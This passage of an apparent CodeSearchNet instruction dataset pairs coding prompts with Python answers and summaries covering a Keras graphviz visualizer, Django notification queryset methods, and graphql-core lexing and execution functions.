style=\"filled\", fillcolor=\"#2c3e50\", fontcolor=\"white\");\n                    for h in range(nodes_up - last_layer_nodes + 1 , nodes_up + 1):\n                        g.edge(str(h), str(n));\n                    last_layer_nodes = 1;\n                    nodes_up += 1;\n                elif (layer_types[i] == \"Dropout\"):\n                    n += 1;\n                    c.attr(color=\"white\");\n                    c.node(str(n), label=\"Dropout Layer\", style=\"filled\", fontcolor=\"white\", fillcolor=\"#f39c12\");\n                    for h in range(nodes_up - last_layer_nodes + 1 , nodes_up + 1):\n                        g.edge(str(h), str(n));\n                    last_layer_nodes = 1;\n                    nodes_up += 1;\n                elif (layer_types[i] == \"Activation\"):\n                    n += 1;\n                    c.attr(color=\"white\");\n                    fnc = model.layers[i].get_config()['activation'];\n                    c.node(str(n), shape=\"octagon\", label=\"Activation Layer\\nFunction: \"+fnc, style=\"filled\", fontcolor=\"white\", fillcolor=\"#00b894\");\n                    for h in range(nodes_up - last_layer_nodes + 1 , nodes_up + 1):\n                        g.edge(str(h), str(n));\n                    last_layer_nodes = 1;\n                    nodes_up += 1;\n\n\n        with g.subgraph(name='cluster_output') as c:\n            if (type(model.layers[-1]) == keras.layers.core.Dense):\n                c.attr(color='white')\n                c.attr(rank='same');\n                c.attr(labeljust=\"1\");\n                for i in range(1, output_layer+1):\n                    n += 1;\n                    c.node(str(n), shape=\"circle\", style=\"filled\", color=\"#e74c3c\", fontcolor=\"#e74c3c\");\n                    for h in range(nodes_up - last_layer_nodes + 1 , nodes_up + 1):\n                        g.edge(str(h), str(n));\n                c.attr(label='Output Layer', labelloc=\"bottom\")\n                c.node_attr.update(color=\"#2ecc71\", style=\"filled\", fontcolor=\"#2ecc71\", shape=\"circle\");\n\n        g.attr(arrowShape=\"none\");\n        g.edge_attr.update(arrowhead=\"none\", color=\"#707070\");\n        if view == True:\n            g.view();", "response": "A function that creates a graphviz graph from a Keras Sequential model."}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nreturns only unread items in the current queryset", "response": "def unread(self, include_deleted=False):\n        \"\"\"Return only unread items in the current queryset\"\"\"\n        if is_soft_delete() and not include_deleted:\n            return self.filter(unread=True, deleted=False)\n\n        # When SOFT_DELETE=False, developers are supposed NOT to touch 'deleted' field.\n        # In this case, to improve query performance, don't filter by 'deleted' field\n        return self.filter(unread=True)"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef read(self, include_deleted=False):\n        if is_soft_delete() and not include_deleted:\n            return self.filter(unread=False, deleted=False)\n\n        # When SOFT_DELETE=False, developers are supposed NOT to touch 'deleted' field.\n        # In this case, to improve query performance, don't filter by 'deleted' field\n        return self.filter(unread=False)", "response": "Return only read items in the current queryset"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef mark_all_as_read(self, recipient=None):\n        # We want to filter out read ones, as later we will store\n        # the time they were marked as read.\n        qset = self.unread(True)\n        if recipient:\n            qset = qset.filter(recipient=recipient)\n\n        return qset.update(unread=False)", "response": "Mark all unread messages in the current queryset as read."}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nmark all read messages in the current queryset as unread any read messages in the specified recipient.", "response": "def mark_all_as_unread(self, recipient=None):\n        \"\"\"Mark as unread any read messages in the current queryset.\n\n        Optionally, filter these by recipient first.\n        \"\"\"\n        qset = self.read(True)\n\n        if recipient:\n            qset = qset.filter(recipient=recipient)\n\n        return qset.update(unread=True)"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef mark_all_as_deleted(self, recipient=None):\n        assert_soft_delete()\n        qset = self.active()\n        if recipient:\n            qset = qset.filter(recipient=recipient)\n\n        return qset.update(deleted=True)", "response": "Mark all items in the queryset as deleted."}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nmarks all objects in the queryset as active.", "response": "def mark_all_as_active(self, recipient=None):\n        \"\"\"Mark current queryset as active(un-deleted).\n        Optionally, filter by recipient first.\n        \"\"\"\n        assert_soft_delete()\n        qset = self.deleted()\n        if recipient:\n            qset = qset.filter(recipient=recipient)\n\n        return qset.update(deleted=False)"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nreturn the time of the record in the current locale.", "response": "def timesince(self, now=None):\n        \"\"\"\n        Shortcut for the ``django.utils.timesince.timesince`` function of the\n        current timestamp.\n        \"\"\"\n        from django.utils.timesince import timesince as timesince_\n        return timesince_(self.timestamp, now)"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nreturning a json with a unread notification list", "response": "def live_unread_notification_list(request):\n    ''' Return a json with a unread notification list '''\n    try:\n        user_is_authenticated = request.user.is_authenticated()\n    except TypeError:  # Django >= 1.11\n        user_is_authenticated = request.user.is_authenticated\n\n    if not user_is_authenticated:\n        data = {\n            'unread_count': 0,\n            'unread_list': []\n        }\n        return JsonResponse(data)\n\n    default_num_to_fetch = get_config()['NUM_TO_FETCH']\n    try:\n        # If they don't specify, make it 5.\n        num_to_fetch = request.GET.get('max', default_num_to_fetch)\n        num_to_fetch = int(num_to_fetch)\n        if not (1 <= num_to_fetch <= 100):\n            num_to_fetch = default_num_to_fetch\n    except ValueError:  # If casting to an int fails.\n        num_to_fetch = default_num_to_fetch\n\n    unread_list = []\n\n    for notification in request.user.notifications.unread()[0:num_to_fetch]:\n        struct = model_to_dict(notification)\n        struct['slug'] = id2slug(notification.id)\n        if notification.actor:\n            struct['actor'] = str(notification.actor)\n        if notification.target:\n            struct['target'] = str(notification.target)\n        if notification.action_object:\n            struct['action_object'] = str(notification.action_object)\n        if notification.data:\n            struct['data'] = notification.data\n        unread_list.append(struct)\n        if request.GET.get('mark_as_read'):\n            notification.mark_as_read()\n    data = {\n        'unread_count': request.user.notifications.unread().count(),\n        'unread_list': unread_list\n    }\n    return JsonResponse(data)"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef uni_char_code(a: str, b: str, c: str, d: str):\n    return char2hex(a) << 12 | char2hex(b) << 8 | char2hex(c) << 4 | char2hex(d)", "response": "Convert unicode characters to integers."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef char2hex(a: str):\n    if \"0\" <= a <= \"9\":\n        return ord(a) - 48\n    elif \"A\" <= a <= \"F\":\n        return ord(a) - 55\n    elif \"a\" <= a <= \"f\":  # a-f\n        return ord(a) - 87\n    return -1", "response": "Convert a hex character to its integer value."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef desc(self) -> str:\n        kind, value = self.kind.value, self.value\n        return f\"{kind} {value!r}\" if value else kind", "response": "A helper property to describe a token as a string for debugging"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef read_token(self, prev: Token) -> Token:\n        source = self.source\n        body = source.body\n        body_length = len(body)\n\n        pos = self.position_after_whitespace(body, prev.end)\n        line = self.line\n        col = 1 + pos - self.line_start\n\n        if pos >= body_length:\n            return Token(TokenKind.EOF, body_length, body_length, line, col, prev)\n\n        char = body[pos]\n        kind = _KIND_FOR_PUNCT.get(char)\n        if kind:\n            return Token(kind, pos, pos + 1, line, col, prev)\n        if char == \"#\":\n            return self.read_comment(pos, line, col, prev)\n        elif char == \".\":\n            if body[pos + 1 : pos + 3] == \"..\":\n                return Token(TokenKind.SPREAD, pos, pos + 3, line, col, prev)\n        elif \"A\" <= char <= \"Z\" or \"a\" <= char <= \"z\" or char == \"_\":\n            return self.read_name(pos, line, col, prev)\n        elif \"0\" <= char <= \"9\" or char == \"-\":\n            return self.read_number(pos, char, line, col, prev)\n        elif char == '\"':\n            if body[pos + 1 : pos + 3] == '\"\"':\n                return self.read_block_string(pos, line, col, prev)\n            return self.read_string(pos, line, col, prev)\n\n        raise GraphQLSyntaxError(source, pos, unexpected_character_message(char))", "response": "Read the next lexable token from the source starting at the given position."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\ngoing to next non - whitespace character in the body.", "response": "def position_after_whitespace(self, body: str, start_position: int) -> int:\n        \"\"\"Go to next position after a whitespace.\n\n        Reads from body starting at start_position until it finds a non-whitespace\n        character, then returns the position of that character for lexing.\n        \"\"\"\n        body_length = len(body)\n        position = start_position\n        while position < body_length:\n            char = body[position]\n            if char in \" \\t,\\ufeff\":\n                position += 1\n            elif char == \"\\n\":\n                position += 1\n                self.line += 1\n                self.line_start = position\n            elif char == \"\\r\":\n                if body[position + 1 : position + 2] == \"\\n\":\n                    position += 2\n                else:\n                    position += 1\n                self.line += 1\n                self.line_start = position\n            else:\n                break\n        return position"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef read_comment(self, start: int, line: int, col: int, prev: Token) -> Token:\n        body = self.source.body\n        body_length = len(body)\n\n        position = start\n        while True:\n            position += 1\n            if position > body_length:\n                break\n            char = body[position]\n            if char < \" \" and char != \"\\t\":\n                break\n        return Token(\n            TokenKind.COMMENT,\n            start,\n            position,\n            line,\n            col,\n            prev,\n            body[start + 1 : position],\n        )", "response": "Read a comment token from the source file."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef read_number(\n        self, start: int, char: str, line: int, col: int, prev: Token\n    ) -> Token:\n        \"\"\"Reads a number token from the source file.\n\n        Either a float or an int depending on whether a decimal point appears.\n        \"\"\"\n        source = self.source\n        body = source.body\n        position = start\n        is_float = False\n        if char == \"-\":\n            position += 1\n            char = body[position : position + 1]\n        if char == \"0\":\n            position += 1\n            char = body[position : position + 1]\n            if \"0\" <= char <= \"9\":\n                raise GraphQLSyntaxError(\n                    source,\n                    position,\n                    f\"Invalid number, unexpected digit after 0: {print_char(char)}.\",\n                )\n        else:\n            position = self.read_digits(position, char)\n            char = body[position : position + 1]\n        if char == \".\":\n            is_float = True\n            position += 1\n            char = body[position : position + 1]\n            position = self.read_digits(position, char)\n            char = body[position : position + 1]\n        if char and char in \"Ee\":\n            is_float = True\n            position += 1\n            char = body[position : position + 1]\n            if char and char in \"+-\":\n                position += 1\n                char = body[position : position + 1]\n            position = self.read_digits(position, char)\n        return Token(\n            TokenKind.FLOAT if is_float else TokenKind.INT,\n            start,\n            position,\n            line,\n            col,\n            prev,\n            body[start:position],\n        )", "response": "Reads a number token from the source file."}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nreading digits from the source.", "response": "def read_digits(self, start: int, char: str) -> int:\n        \"\"\"Return the new position in the source after reading digits.\"\"\"\n        source = self.source\n        body = source.body\n        position = start\n        while \"0\" <= char <= \"9\":\n            position += 1\n            char = body[position : position + 1]\n        if position == start:\n            raise GraphQLSyntaxError(\n                source,\n                position,\n                f\"Invalid number, expected digit but got: {print_char(char)}.\",\n            )\n        return position"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef read_string(self, start: int, line: int, col: int, prev: Token) -> Token:\n        source = self.source\n        body = source.body\n        body_length = len(body)\n        position = start + 1\n        chunk_start = position\n        value: List[str] = []\n        append = value.append\n\n        while position < body_length:\n            char = body[position]\n            if char in \"\\n\\r\":\n                break\n            if char == '\"':\n                append(body[chunk_start:position])\n                return Token(\n                    TokenKind.STRING,\n                    start,\n                    position + 1,\n                    line,\n                    col,\n                    prev,\n                    \"\".join(value),\n                )\n            if char < \" \" and char != \"\\t\":\n                raise GraphQLSyntaxError(\n                    source,\n                    position,\n                    f\"Invalid character within String: {print_char(char)}.\",\n                )\n            position += 1\n            if char == \"\\\\\":\n                append(body[chunk_start : position - 1])\n                char = body[position : position + 1]\n                escaped = _ESCAPED_CHARS.get(char)\n                if escaped:\n                    value.append(escaped)\n                elif char == \"u\" and position + 4 < body_length:\n                    code = uni_char_code(*body[position + 1 : position + 5])\n                    if code < 0:\n                        escape = repr(body[position : position + 5])\n                        escape = escape[:1] + \"\\\\\" + escape[1:]\n                        raise GraphQLSyntaxError(\n                            source,\n                            position,\n                            f\"Invalid character escape sequence: {escape}.\",\n                        )\n                    append(chr(code))\n                    position += 4\n                else:\n                    escape = repr(char)\n                    escape = escape[:1] + \"\\\\\" + escape[1:]\n                    raise GraphQLSyntaxError(\n                        source,\n                        position,\n                        f\"Invalid character escape sequence: {escape}.\",\n                    )\n                position += 1\n                chunk_start = position\n\n        raise GraphQLSyntaxError(source, position, \"Unterminated string.\")", "response": "Read a string token from the source file."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nreading an alphanumeric + underscore name from the source.", "response": "def read_name(self, start: int, line: int, col: int, prev: Token) -> Token:\n        \"\"\"Read an alphanumeric + underscore name from the source.\"\"\"\n        body = self.source.body\n        body_length = len(body)\n        position = start + 1\n        while position < body_length:\n            char = body[position]\n            if not (\n                char == \"_\"\n                or \"0\" <= char <= \"9\"\n                or \"A\" <= char <= \"Z\"\n                or \"a\" <= char <= \"z\"\n            ):\n                break\n            position += 1\n        return Token(\n            TokenKind.NAME, start, position, line, col, prev, body[start:position]\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nexecuting a GraphQL operation.", "response": "def execute(\n    schema: GraphQLSchema,\n    document: DocumentNode,\n    root_value: Any = None,\n    context_value: Any = None,\n    variable_values: Dict[str, Any] = None,\n    operation_name: str = None,\n    field_resolver: GraphQLFieldResolver = None,\n    type_resolver: GraphQLTypeResolver = None,\n    middleware: Middleware = None,\n    execution_context_class: Type[\"ExecutionContext\"] = None,\n) -> AwaitableOrValue[ExecutionResult]:\n    \"\"\"Execute a GraphQL operation.\n\n    Implements the \"Evaluating requests\" section of the GraphQL specification.\n\n    Returns an ExecutionResult (if all encountered resolvers are synchronous),\n    or a coroutine object eventually yielding an ExecutionResult.\n\n    If the arguments to this function do not result in a legal execution context,\n    a GraphQLError will be thrown immediately explaining the invalid input.\n    \"\"\"\n    # If arguments are missing or incorrect, throw an error.\n    assert_valid_execution_arguments(schema, document, variable_values)\n\n    if execution_context_class is None:\n        execution_context_class = ExecutionContext\n\n    # If a valid execution context cannot be created due to incorrect arguments,\n    # a \"Response\" with only errors is returned.\n    exe_context = execution_context_class.build(\n        schema,\n        document,\n        root_value,\n        context_value,\n        variable_values,\n        operation_name,\n        field_resolver,\n        type_resolver,\n        middleware,\n    )\n\n    # Return early errors if execution context failed.\n    if isinstance(exe_context, list):\n        return ExecutionResult(data=None, errors=exe_context)\n\n    # Return a possible coroutine object that will eventually yield the data described\n    # by the \"Response\" section of the GraphQL specification.\n    #\n    # If errors are encountered while executing a GraphQL field, only that field and\n    # its descendants will be omitted, and sibling fields will still be executed. An\n    # execution which encounters errors will still result in a coroutine object that\n    # can be executed without errors.\n\n    data = exe_context.execute_operation(exe_context.operation, root_value)\n    return exe_context.build_response(data)"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\ncheck that the arguments are acceptable.", "response": "def assert_valid_execution_arguments(\n    schema: GraphQLSchema,\n    document: DocumentNode,\n    raw_variable_values: Dict[str, Any] = None,\n) -> None:\n    \"\"\"Check that the arguments are acceptable.\n\n    Essential assertions before executing to provide developer feedback for improper use\n    of the GraphQL library.\n    \"\"\"\n    if not document:\n        raise TypeError(\"Must provide document\")\n\n    # If the schema used for execution is invalid, throw an error.\n    assert_valid_schema(schema)\n\n    # Variables, if provided, must be a dictionary.\n    if not (raw_variable_values is None or isinstance(raw_variable_values, dict)):\n        raise TypeError(\n            \"Variables must be provided as a dictionary where each property is a\"\n            \" variable value. Perhaps look to see if an unparsed JSON string was\"\n            \" provided.\"\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\ngets response path as a list.", "response": "def response_path_as_list(path: ResponsePath) -> List[Union[str, int]]:\n    \"\"\"Get response path as a list.\n\n    Given a ResponsePath (found in the `path` entry in the information provided as the\n    last argument to a field resolver), return a list of the path keys.\n    \"\"\"\n    flattened: List[Union[str, int]] = []\n    append = flattened.append\n    curr: Optional[ResponsePath] = path\n    while curr:\n        append(curr.key)\n        curr = curr.prev\n    return flattened[::-1]"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef add_path(prev: Optional[ResponsePath], key: Union[str, int]) -> ResponsePath:\n    return ResponsePath(prev, key)", "response": "Add a key to a ResponsePath."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nget the field definition.", "response": "def get_field_def(\n    schema: GraphQLSchema, parent_type: GraphQLObjectType, field_name: str\n) -> GraphQLField:\n    \"\"\"Get field definition.\n\n    This method looks up the field on the given type definition. It has special casing\n    for the two introspection fields, `__schema` and `__typename`. `__typename` is\n    special because it can always be queried as a field, even in situations where no\n    other fields are allowed, like on a Union. `__schema` could get automatically\n    added to the query type, but that would require mutating type definitions, which\n    would cause issues.\n    \"\"\"\n    if field_name == \"__schema\" and schema.query_type == parent_type:\n        return SchemaMetaFieldDef\n    elif field_name == \"__type\" and schema.query_type == parent_type:\n        return TypeMetaFieldDef\n    elif field_name == \"__typename\":\n        return TypeNameMetaFieldDef\n    return parent_type.fields.get(field_name)"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nimplements the logic to compute the key of a given field s entry", "response": "def get_field_entry_key(node: FieldNode) -> str:\n    \"\"\"Implements the logic to compute the key of a given field's entry\"\"\"\n    return node.alias.value if node.alias else node.name.value"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef invalid_return_type_error(\n    return_type: GraphQLObjectType, result: Any, field_nodes: List[FieldNode]\n) -> GraphQLError:\n    \"\"\"Create a GraphQLError for an invalid return type.\"\"\"\n    return GraphQLError(\n        f\"Expected value of type '{return_type.name}' but got: {inspect(result)}.\",\n        field_nodes,\n    )", "response": "Create a GraphQLError for an invalid return type."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\ndefault type resolver function.", "response": "def default_type_resolver(\n    value: Any, info: GraphQLResolveInfo, abstract_type: GraphQLAbstractType\n) -> AwaitableOrValue[Optional[Union[GraphQLObjectType, str]]]:\n    \"\"\"Default type resolver function.\n\n    If a resolve_type function is not given, then a default resolve behavior is used\n    which attempts two strategies:\n\n    First, See if the provided value has a `__typename` field defined, if so, use that\n    value as name of the resolved type.\n\n    Otherwise, test each possible type for the abstract type by calling `is_type_of`\n    for the object being coerced, returning the first type that matches.\n    \"\"\"\n    # First, look for `__typename`.\n    type_name = (\n        value.get(\"__typename\")\n        if isinstance(value, dict)\n        # need to de-mangle the attribute assumed to be \"private\" in Python\n        else getattr(value, f\"_{value.__class__.__name__}__typename\", None)\n    )\n    if isinstance(type_name, str):\n        return type_name\n\n    # Otherwise, test each possible type.\n    possible_types = info.schema.get_possible_types(abstract_type)\n    awaitable_is_type_of_results: List[Awaitable] = []\n    append_awaitable_results = awaitable_is_type_of_results.append\n    awaitable_types: List[GraphQLObjectType] = []\n    append_awaitable_types = awaitable_types.append\n\n    for type_ in possible_types:\n        if type_.is_type_of:\n            is_type_of_result = type_.is_type_of(value, info)\n\n            if isawaitable(is_type_of_result):\n                append_awaitable_results(cast(Awaitable, is_type_of_result))\n                append_awaitable_types(type_)\n            elif is_type_of_result:\n                return type_\n\n    if awaitable_is_type_of_results:\n        # noinspection PyShadowingNames\n        async def get_type():\n            is_type_of_results = await gather(*awaitable_is_type_of_results)\n            for is_type_of_result, type_ in zip(is_type_of_results, awaitable_types):\n                if is_type_of_result:\n                    return type_\n\n        return get_type()\n\n    return None"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\ndefault field resolver. If a resolve function is not given, then a default resolve behavior is used which takes the property of the source object of the same name as the field and returns it as the result, or if it's a function, returns the result of calling that function while passing along args and context. For dictionaries, the field names are used as keys, for all other objects they are used as attribute names.", "response": "def default_field_resolver(source, info, **args):\n    \"\"\"Default field resolver.\n\n    If a resolve function is not given, then a default resolve behavior is used which\n    takes the property of the source object of the same name as the field and returns\n    it as the result, or if it's a function, returns the result of calling that function\n    while passing along args and context.\n\n    For dictionaries, the field names are used as keys, for all other objects they are\n    used as attribute names.\n    \"\"\"\n    # Ensure source is a value for which property access is acceptable.\n    field_name = info.field_name\n    value = (\n        source.get(field_name)\n        if isinstance(source, dict)\n        else getattr(source, field_name, None)\n    )\n    if callable(value):\n        return value(info, **args)\n    return value"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nbuilds an execution context from the arguments passed to execute.", "response": "def build(\n        cls,\n        schema: GraphQLSchema,\n        document: DocumentNode,\n        root_value: Any = None,\n        context_value: Any = None,\n        raw_variable_values: Dict[str, Any] = None,\n        operation_name: str = None,\n        field_resolver: GraphQLFieldResolver = None,\n        type_resolver: GraphQLTypeResolver = None,\n        middleware: Middleware = None,\n    ) -> Union[List[GraphQLError], \"ExecutionContext\"]:\n        \"\"\"Build an execution context\n\n        Constructs a ExecutionContext object from the arguments passed to execute, which\n        we will pass throughout the other execution methods.\n\n        Throws a GraphQLError if a valid execution context cannot be created.\n        \"\"\"\n        errors: List[GraphQLError] = []\n        operation: Optional[OperationDefinitionNode] = None\n        has_multiple_assumed_operations = False\n        fragments: Dict[str, FragmentDefinitionNode] = {}\n        middleware_manager: Optional[MiddlewareManager] = None\n        if middleware is not None:\n            if isinstance(middleware, (list, tuple)):\n                middleware_manager = MiddlewareManager(*middleware)\n            elif isinstance(middleware, MiddlewareManager):\n                middleware_manager = middleware\n            else:\n                raise TypeError(\n                    \"Middleware must be passed as a list or tuple of functions\"\n                    \" or objects, or as a single MiddlewareManager object.\"\n                    f\" Got {inspect(middleware)} instead.\"\n                )\n\n        for definition in document.definitions:\n            if isinstance(definition, OperationDefinitionNode):\n                if not operation_name and operation:\n                    has_multiple_assumed_operations = True\n                elif not operation_name or (\n                    definition.name and definition.name.value == operation_name\n                ):\n                    operation = definition\n            elif isinstance(definition, FragmentDefinitionNode):\n                fragments[definition.name.value] = definition\n\n        if not operation:\n            if operation_name:\n                errors.append(\n                    GraphQLError(f\"Unknown operation named '{operation_name}'.\")\n                )\n            else:\n                errors.append(GraphQLError(\"Must provide an operation.\"))\n        elif has_multiple_assumed_operations:\n            errors.append(\n                GraphQLError(\n                    \"Must provide operation name\"\n                    \" if query contains multiple operations.\"\n                )\n            )\n\n        variable_values = None\n        if operation:\n            coerced_variable_values = get_variable_values(\n                schema, operation.variable_definitions or [], raw_variable_values or {}\n            )\n\n            if coerced_variable_values.errors:\n                errors.extend(coerced_variable_values.errors)\n            else:\n                variable_values = coerced_variable_values.coerced\n\n        if errors:\n            return errors\n\n        if operation is None:\n            raise TypeError(\"Has operation if no errors.\")\n        if variable_values is None:\n            raise TypeError(\"Has variables if no errors.\")\n\n        return cls(\n            schema,\n            fragments,\n            root_value,\n            context_value,\n            operation,\n            variable_values,\n            field_resolver or default_field_resolver,\n            type_resolver or default_type_resolver,\n            middleware_manager,\n            errors,\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nbuilding the response. given a completed execution context and data.", "response": "def build_response(\n        self, data: AwaitableOrValue[Optional[Dict[str, Any]]]\n    ) -> AwaitableOrValue[ExecutionResult]:\n        \"\"\"Build response.\n\n        Given a completed execution context and data, build the (data, errors) response\n        defined by the \"Response\" section of the GraphQL spec.\n        \"\"\"\n        if isawaitable(data):\n\n            async def build_response_async():\n                return self.build_response(await data)\n\n            return build_response_async()\n        data = cast(Optional[Dict[str, Any]], data)\n        errors = self.errors\n        if not errors:\n            return ExecutionResult(data, None)\n        # Sort the error list in order to make it deterministic, since we might have\n        # been using parallel execution.\n        errors.sort(key=lambda error: (error.locations, error.path, error.message))\n        return ExecutionResult(data, errors)"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef execute_operation(\n        self, operation: OperationDefinitionNode, root_value: Any\n    ) -> Optional[AwaitableOrValue[Any]]:\n        \"\"\"Execute an operation.\n\n        Implements the \"Evaluating operations\" section of the spec.\n        \"\"\"\n        type_ = get_operation_root_type(self.schema, operation)\n        fields = self.collect_fields(type_, operation.selection_set, {}, set())\n\n        path = None\n\n        # Errors from sub-fields of a NonNull type may propagate to the top level, at\n        # which point we still log the error and null the parent field, which in this\n        # case is the entire response.\n        #\n        # Similar to complete_value_catching_error.\n        try:\n            result = (\n                self.execute_fields_serially\n                if operation.operation == OperationType.MUTATION\n                else self.execute_fields\n            )(type_, root_value, path, fields)\n        except GraphQLError as error:\n            self.errors.append(error)\n            return None\n        except Exception as error:\n            error = GraphQLError(str(error), original_error=error)\n            self.errors.append(error)\n            return None\n        else:\n            if isawaitable(result):\n                # noinspection PyShadowingNames\n                async def await_result():\n                    try:\n                        return await result\n                    except GraphQLError as error:\n                        self.errors.append(error)\n                    except Exception as error:\n                        error = GraphQLError(str(error), original_error=error)\n                        self.errors.append(error)\n\n                return await_result()\n            return result", "response": "Execute an operation.\n\n        Implements the \"Evaluating operations\" section of the spec."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nexecute the given fields serially.", "response": "def execute_fields_serially(\n        self,\n        parent_type: GraphQLObjectType,\n        source_value: Any,\n        path: Optional[ResponsePath],\n        fields: Dict[str, List[FieldNode]],\n    ) -> AwaitableOrValue[Dict[str, Any]]:\n        \"\"\"Execute the given fields serially.\n\n        Implements the \"Evaluating selection sets\" section of the spec for \"write\" mode.\n        \"\"\"\n        results: Dict[str, Any] = {}\n        for response_name, field_nodes in fields.items():\n            field_path = add_path(path, response_name)\n            result = self.resolve_field(\n                parent_type, source_value, field_nodes, field_path\n            )\n            if result is INVALID:\n                continue\n            if isawaitable(results):\n                # noinspection PyShadowingNames\n                async def await_and_set_result(results, response_name, result):\n                    awaited_results = await results\n                    awaited_results[response_name] = (\n                        await result if isawaitable(result) else result\n                    )\n                    return awaited_results\n\n                # noinspection PyTypeChecker\n                results = await_and_set_result(\n                    cast(Awaitable, results), response_name, result\n                )\n            elif isawaitable(result):\n                # noinspection PyShadowingNames\n                async def set_result(results, response_name, result):\n                    results[response_name] = await result\n                    return results\n\n                # noinspection PyTypeChecker\n                results = set_result(results, response_name, result)\n            else:\n                results[response_name] = result\n        if isawaitable(results):\n            # noinspection PyShadowingNames\n            async def get_results():\n                return await cast(Awaitable, results)\n\n            return get_results()\n        return results"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nexecuting the given fields concurrently.", "response": "def execute_fields(\n        self,\n        parent_type: GraphQLObjectType,\n        source_value: Any,\n        path: Optional[ResponsePath],\n        fields: Dict[str, List[FieldNode]],\n    ) -> AwaitableOrValue[Dict[str, Any]]:\n        \"\"\"Execute the given fields concurrently.\n\n        Implements the \"Evaluating selection sets\" section of the spec for \"read\" mode.\n        \"\"\"\n        results = {}\n        awaitable_fields: List[str] = []\n        append_awaitable = awaitable_fields.append\n        for response_name, field_nodes in fields.items():\n            field_path = add_path(path, response_name)\n            result = self.resolve_field(\n                parent_type, source_value, field_nodes, field_path\n            )\n            if result is not INVALID:\n                results[response_name] = result\n                if isawaitable(result):\n                    append_awaitable(response_name)\n\n        #  If there are no coroutines, we can just return the object\n        if not awaitable_fields:\n            return results\n\n        # Otherwise, results is a map from field name to the result of resolving that\n        # field, which is possibly a coroutine object. Return a coroutine object that\n        # will yield this same map, but with any coroutines awaited in parallel and\n        # replaced with the values they yielded.\n        async def get_results():\n            results.update(\n                zip(\n                    awaitable_fields,\n                    await gather(*(results[field] for field in awaitable_fields)),\n                )\n            )\n            return results\n\n        return get_results()"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\ncollects fields. Given a SelectionSetNode adds all of the fields in that selection to the passed in fields and returns it at the end.", "response": "def collect_fields(\n        self,\n        runtime_type: GraphQLObjectType,\n        selection_set: SelectionSetNode,\n        fields: Dict[str, List[FieldNode]],\n        visited_fragment_names: Set[str],\n    ) -> Dict[str, List[FieldNode]]:\n        \"\"\"Collect fields.\n\n        Given a selection_set, adds all of the fields in that selection to the passed in\n        map of fields, and returns it at the end.\n\n        collect_fields requires the \"runtime type\" of an object. For a field which\n        returns an Interface or Union type, the \"runtime type\" will be the actual\n        Object type returned by that field.\n        \"\"\"\n        for selection in selection_set.selections:\n            if isinstance(selection, FieldNode):\n                if not self.should_include_node(selection):\n                    continue\n                name = get_field_entry_key(selection)\n                fields.setdefault(name, []).append(selection)\n            elif isinstance(selection, InlineFragmentNode):\n                if not self.should_include_node(\n                    selection\n                ) or not self.does_fragment_condition_match(selection, runtime_type):\n                    continue\n                self.collect_fields(\n                    runtime_type,\n                    selection.selection_set,\n                    fields,\n                    visited_fragment_names,\n                )\n            elif isinstance(selection, FragmentSpreadNode):\n                frag_name = selection.name.value\n                if frag_name in visited_fragment_names or not self.should_include_node(\n                    selection\n                ):\n                    continue\n                visited_fragment_names.add(frag_name)\n                fragment = self.fragments.get(frag_name)\n                if not fragment or not self.does_fragment_condition_match(\n                    fragment, runtime_type\n                ):\n                    continue\n                self.collect_fields(\n                    runtime_type, fragment.selection_set, fields, visited_fragment_names\n                )\n        return fields"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef should_include_node(\n        self, node: Union[FragmentSpreadNode, FieldNode, InlineFragmentNode]\n    ) -> bool:\n        \"\"\"Check if node should be included\n\n        Determines if a field should be included based on the @include and @skip\n        directives, where @skip has higher precedence than @include.\n        \"\"\"\n        skip = get_directive_values(GraphQLSkipDirective, node, self.variable_values)\n        if skip and skip[\"if\"]:\n            return False\n\n        include = get_directive_values(\n            GraphQLIncludeDirective, node, self.variable_values\n        )\n        if include and not include[\"if\"]:\n            return False\n\n        return True", "response": "Check if a node should be included based on the include and skip directives."}
